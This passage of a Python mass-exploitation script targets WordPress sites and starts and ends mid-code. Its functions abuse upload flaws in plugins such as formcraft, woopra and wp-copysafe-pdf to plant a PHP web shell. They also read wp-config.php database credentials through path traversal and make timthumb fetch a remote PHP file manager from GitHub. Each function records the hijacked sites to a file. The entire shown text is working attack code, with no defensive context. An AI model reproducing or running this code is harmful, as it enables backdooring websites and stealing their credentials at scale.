		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-symposium eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('wp-symposium.txt', 'a').write(host+'/wp-content/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-symposium Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def pinb(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1', files=files)

		
		
		lib = requests.get(host+"/wp-content/themes/pinboard/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}pinboard eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('pinboard.txt', 'a').write(host+'/wp-content/themes/pinboard/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}pinboard Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def clat(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'files[]': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/formcraft/file-upload/server/php/', files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/formcraft/file-upload/server/php/files/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}formcraft eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('formcraft.txt', 'a').write(host+'/wp-content/plugins/formcraft/file-upload/server/php/files/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}formcraft Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def picx(host):


	try:
	
	
		host = host.strip()
		
		post = {'uploadfile': (filec, shell, 'text/html'),'albumId' : '1','mode' : 'image'}
		
		
		req = requests.post(host+'/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/uploads/pica-photo-gallery/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}pica-photo-gallery eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('pica-photo-gallery.txt', 'a').write(host+'/wp-content/uploads/pica-photo-gallery/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}pica-photo-gallery Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def reht(host):


	try:
	
	
		host = host.strip()
		

		post = {'dir' : '../../&from=wp-config.php&to=wp-config.txt'}
		
		req = requests.get(host+"/wp-admin/admin-ajax.php?action=mfma_relocator_renamedir")
		
		lib = requests.get(host+"/wp-config.txt")
				
		if 'DB_USER' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}media-file-manager eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('media-file-manager.txt', 'a').write(host+'/wp-config.txt'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}media-file-manager Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def conl(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'nm_webcontact_upload_file'}
		
		files = {'Filedata': (filesname, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php', files=files,data=post)
		
		
		lib = requests.get(host+"/wp-content/uploads/contact_files/"+filesname)
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}contact form eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('contactform.txt', 'a').write(host+'/wp-content/uploads/contact_files/'+filesname+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}contact form Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def memb(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php")
				
		if 'DB_USER' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}membership-simplified eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('membership-simplified-for-oap-members-only.txt', 'a').write(host+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}membership-simplified Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def memr(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php")
				
		if 'DB_USER' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}ecommerce-shop-styling eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('wp-ecommerce-shop-styling.txt', 'a').write(host+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}ecommerce-shop-styling Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		


def izxc(host):


	try:
	
	
		host = host.strip()
		
		post = {'upload_path': '../../../../uploads/'}
		
		files = {'wpcsp_file': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php', files=files,data=post)
		
		
		lib = requests.get(host+"/wp-content/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-copysafe-pdf eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('wp-copysafe-pdf.txt', 'a').write(host+'/wp-content/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wp-copysafe-pdf Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def izxt(host):


	try:
	
	
		host = host.strip()
		
		post = {'dm_upload': ''}
		
		files = {'upfile': (filec, shell, 'text/html')}

		req = requests.post(host, files=files,data=post)
		
		
		lib = requests.get(host+"/wp-content/plugins/downloads-manager/upload/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}downloads-manager eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('downloads-manager.txt', 'a').write(host+'/wp-content/plugins/downloads-manager/upload/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}downloads-manager Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def wopc(host):


	try:
	
	
		host = host.strip()
		
		headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/woopra/inc/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/woopra/inc/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}woopra eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('woopra.txt', 'a').write(host+'/wp-content/plugins/woopra/inc/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}woopra Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def wpt1(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/db-toolkit/libs/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/db-toolkit/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/db-toolkit/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/db-toolkit/libs/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/db-toolkit/libs/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt2(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/dukapress/lib/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/dukapress/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/dukapress/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/dukapress/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/dukapress/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt3(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/easy-comment-uploads/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/easy-comment-uploads/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/easy-comment-uploads/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/easy-comment-uploads/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/easy-comment-uploads/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt4(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/events-manager/includes/thumbnails/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/events-manager/includes/thumbnails/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/events-manager/includes/thumbnails/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/events-manager/includes/thumbnails/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/events-manager/includes/thumbnails/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt5(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/igit-related-posts-with-thumb-images-after-posts/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/igit-related-posts-with-thumb-images-after-posts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/igit-related-posts-with-thumb-images-after-posts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/igit-related-posts-with-thumb-images-after-posts/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/igit-related-posts-with-thumb-images-after-posts/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt6(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/image-rotator-widget/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/image-rotator-widget/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/image-rotator-widget/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/image-rotator-widget/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/image-rotator-widget/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt7(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/pictmobi-widget/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/pictmobi-widget/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/pictmobi-widget/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/pictmobi-widget/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/pictmobi-widget/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt8(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/shortcodes-ultimate/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/shortcodes-ultimate/lib/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/shortcodes-ultimate/lib/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt9(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/thethe-image-slider/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/thethe-image-slider/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/thethe-image-slider/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/thethe-image-slider/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/thethe-image-slider/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt10(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/vslider/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/vslider/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/vslider/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/vslider/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/vslider/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt11(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/webphysiology-portfolio/scripts/imageresizer/thumbnail.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/webphysiology-portfolio/scripts/imageresizer/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/webphysiology-portfolio/scripts/imageresizer/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/webphysiology-portfolio/scripts/imageresizer/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/webphysiology-portfolio/scripts/imageresizer/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt12(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/wordpress-gallery-plugin/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/wordpress-gallery-plugin/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/wordpress-gallery-plugin/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wordpress-gallery-plugin/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wordpress-gallery-plugin/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt13(host):

	try:

	
	
		
		host = host.strip()
		


		
		izo = requests.get(host+"/wp-content/plugins/wp-mobile-detector/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/wp-mobile-detector/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/wp-mobile-detector/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}tinymce Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('tinymce.txt', 'a').write(host+'>'+token[0]+'.php'+'\n')
			
		elif 'SinonX' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wp-mobile-detector/cache/c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')			
		
		elif 'SinonX' in lib1.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Uploaded {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('timthumb.txt', 'a').write(host+'/wp-content/plugins/wp-mobile-detector/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def wpt14(host):

	try:

	
	
		
		host = host.strip()
		



		izo = requests.get(host+"/wp-content/plugins/zingiri-web-shop/fws/addons/timthumb/timthumb2.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
		token = re.findall('Unable to open image : /(.*?).php', izo.text)
		
		lib = requests.get(host+"/wp-content/plugins/zingiri-web-shop/fws/addons/timthumb/cache/c4e758b00c25ade40a8d29c6cccef6c4.php")
		lib1 = requests.get(host+"/wp-content/plugins/zingiri-web-shop/fws/addons/timthumb/cache/external_c4e758b00c25ade40a8d29c6cccef6c4.php")		
		
		
		if 'c4e758b00c25ade40a8d29c6cccef6c4.php' in izo.content:
